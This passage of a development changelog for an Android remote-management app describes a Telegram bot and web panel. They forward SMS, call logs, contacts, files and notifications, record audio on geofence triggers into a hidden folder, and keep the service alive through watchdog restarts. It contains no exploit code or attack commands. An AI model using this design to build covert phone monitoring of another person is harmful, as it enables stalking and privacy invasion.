- **Always-on guarantee**: Boot → `BootCompletedReceiver` starts `HttpServerService` → bot starts. If killed: AlarmManager watchdog restarts within 60s. If in deep Doze: JobScheduler fallback restarts within 15min. Bot poll job dying is self-healed within 30s by heartbeat.

## Bug Fixes & Permission Updates (April 2026)

### Geofencing not saving — root cause fixed
- **File**: `plain-web/src/views/tracking-hub/GeofencingView.vue` line 372
- **Cause**: `id: editingDraft.id || null` — JavaScript sent `null` for new fences, kGraphQL rejected a null value for the non-nullable `String id` field in `TrackingFenceInput`, mutation silently failed.
- **Fix**: Changed to `id: editingDraft.id || ''` — sends empty string so the backend correctly creates a new fence with a generated UUID.

### Geofence audio stays in Tracking Hub
- Audio recordings triggered by geofences are stored in `filesDir/.PlainPrivate/GeofenceAudio` and served via the `geofence_audio://` URL scheme in `Files.kt`.
- The Tracking Hub's Geofencing view shows events and audio in its own side panel tabs — they never appear in other media sections. ✅

### New permissions added to web settings page
- **`POST_NOTIFICATIONS`** — needed for local notifications/alerts
- **`ACCESS_BACKGROUND_LOCATION`** (Android 10+) — required for geofencing to work when app is in background; must be requested separately after `ACCESS_FINE_LOCATION`
- **`NOTIFICATION_LISTENER`** — needed for the Telegram notification forwarding feature
- **`BLUETOOTH_CONNECT` + `BLUETOOTH_SCAN`** (Android 12+) — needed for Device Control Hub Bluetooth scanning
- **`PACKAGE_USAGE_STATS`** — special permission (via Settings > Apps > Special Access > Usage Access) required for per-app network usage stats in Device Control Hub
- All new permissions added to: enum, `can()`, `request()`, `getWebList()`, `init()` launchers
- 12 new string resources added to `strings_permissions.xml`

### Geofence audio on Android 14 (API 34) fixed
- **Manifest**: `LocationTrackingService` foreground service type updated to `location|microphone`
- **Service**: `startForeground()` now uses combined `FOREGROUND_SERVICE_TYPE_LOCATION | FOREGROUND_SERVICE_TYPE_MICROPHONE` on Android 14+ (`UPSIDE_DOWN_CAKE`) so `MediaRecorder` can access the mic from within the tracking service
- **Web panel rebuilt**: Vue source changes compiled and deployed to `app/src/main/resources/web/`

## Telegram bot — modern `/apps` panel (April 30, 2026)

Re-imagined `/apps` as an interactive Telegram inline-keyboard browser instead of a flat text dump.

- **Paginated picker** (`renderAppsPickerPage`): 10 apps per page, each row a tappable button labelled with the app name and a 🚫 / ⏱ tag if it's currently blocked or time-limited. Footer rows: Prev / Next / 🔍 Search / 🔄 Refresh.
- **Search-on-demand**: tapping 🔍 sets `pendingInput="appsearch"`; the next message becomes the new query (or `*` to clear). The query (`lastAppsQuery`) is remembered across page jumps.
- **Per-app action menu** (`renderAppDetail`): shows version, APK size, install/update dates, system-vs-user flag, launchability, and current block/limit status. Buttons:
  - ▶️ Launch (only if `canLaunch`) — `PackageHelper.launch`
  - ⚙️ Settings page — `PackageHelper.viewInSettings`
  - 🚫 Block always / ✅ Unblock — `AppBlockHelper.setBlocked`
  - ⏱ 30 min / 1 h / 2 h shortcuts (or ✕ Clear N min limit) — `AppBlockHelper.setTimeLimit`
  - 📥 Download APK — re-uses `cbSendFile(info.path)` (50 MB cap)
  - 🖼 Send icon — `PackageHelper.getIcon(pkg)` → temp PNG → `sendPhoto`
  - 📋 Copy package id (to the device clipboard)
  - 🛒 Play Store (URL button — `inlineKeyboard` now supports `url:…` data prefix)
  - 🗑 Uninstall (hidden for system apps) → confirm step → `PackageHelper.uninstall` opens the on-device removal dialog
  - ◀️ Back to apps
- **Token cache**: re-uses the existing `pkgToken` / `pkgFromToken` MD5-12 cache so callback_data fits Telegram's 64-byte limit even for very long package names.
- **TelegramApiClient changes**: `inlineKeyboard` now treats a `url:` prefix as an InlineKeyboardButton URL; `sendPhoto` now sends `parse_mode=HTML` and uses the correct mime per file extension (so the icon caption renders `<code>` properly).

New callback prefixes added: `apps_pg`, `apps_q`, `appd`, `appl`, `appst`, `appblock`, `appunblock`, `applimit`, `appclim`, `appapk`, `appicn`, `appcp`, `appu`, `appuok`. New pending-input action: `appsearch`.

## Web panel — AutomationView null-safety fix (May 2026)

Fixed the Automation page in Device Control Hub where clicking "New rule" / "New schedule" would show an empty/blank modal.

- `plain-web/src/views/device-hub/AutomationView.vue`: Added null-safety (`?.` and `?? []`) to the `load()` function when extracting `automationRules` and `runs` from GQL response, preventing JavaScript crashes when GQL returns `null` data. Also guarded `filteredRules` computed with `?? []` on `rules.value`.

## Telegram bot — Search + Contact Call History (May 2026)

Added search capability and call history to multiple bot commands:

- **🔍 Search buttons** added to `/contacts`, `/messages`, `/calls`, `/files`, `/blockapp`, `/notifications` — tapping sets `pendingInput` to the matching action token; the user's next text message is consumed as the search query.
- **`consumePendingInput` cases** added for: `contacts_search`, `messages_search`, `calls_search`, `notif_search`, `files_search:<pathToken>`, `blockapp_search`.
- **`renderMessagesPage(query, editMessageId)`** — new suspend function replacing direct `cmdMessages` send; filters SMS conversations by contact name or number.
- **`renderCallsPage(query, offset, editMessageId)`** — existing function extended with a `query` parameter; callback format updated to `calls_pg:<query>:<offset>`.
- **`renderNotificationsPage(query, editMessageId)`** — new regular function replacing `cmdNotifications` send; filters notification log by app/title/text.
- **`renderFileSearchResults(rootPath, query, editMessageId)`** — new regular function using `searchFilesRecursive` to do a depth-limited recursive file search within a folder.
- **`renderContactCallsPage(rawId, offset, editMessageId)`** — new suspend function that collects call logs across all phone numbers for a contact (merged + de-duped), paginated. Added "📋 Call History" button in contact detail view (`renderContactDetail`).
- **Volatile state** vars added: `lastMessagesQuery`, `lastCallsQuery`, `lastNotifQuery`.
- **New callbacks**: `calls_q`, `messages_q`, `messages_refresh`, `contacts_q`, `notif_q`, `notif_refresh`, `files_q`, `blockapp_q`, `c_calls`, `c_calls_pg`.

## Telegram bot — `/mutenotifs` command (April 30, 2026)

Added a one-shot mute switch for the notification forwarding stream so the user can shush the bot without disabling the underlying NotificationListener service.

- **`/mutenotifs`** — flips current state
- **`/mutenotifs on`** (aliases: `1`, `true`, `yes`, `mute`) — silences forwards
- **`/mutenotifs off`** (aliases: `0`, `false`, `no`, `unmute`) — resumes forwards
- Aliases for the command itself: `/mutenotif`, `/mutenotifications`, `/shutup`, `/silence`
- Toggle is volatile (in-memory `forwardNotifications` flag in `TelegramBotManager`) and survives until the bot process is restarted; it does NOT touch the device's notification listener — `/notifications` and `/logs` continue to work and the local notification log keeps recording.
- Confirmation messages include an inline-keyboard button ("🔔 Resume forwards" / "🔕 Mute again") wired to `notif_mute` / `notif_unmute` callbacks for one-tap reverse.
